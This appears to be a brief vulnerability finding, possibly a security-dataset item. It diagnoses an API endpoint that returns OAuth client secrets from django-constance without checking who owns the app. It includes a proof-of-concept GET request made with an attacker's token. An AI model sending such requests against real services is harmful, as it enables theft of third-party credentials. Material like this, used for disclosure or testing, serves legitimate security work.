diagnosis: The endpoint retrieves third-party OAuth app client secrets and redirect URIs directly from django-constance using client-supplied provider and app_id. It fails to check if the requesting user owns or registered the OAuth application, leaking critical client secrets.
exploit_request:
GET /api/oauth-apps/github/gh_app_99102/credentials/ HTTP/1.1
Host: identity.devcenter.org
Authorization: Bearer <attacker_jwt>
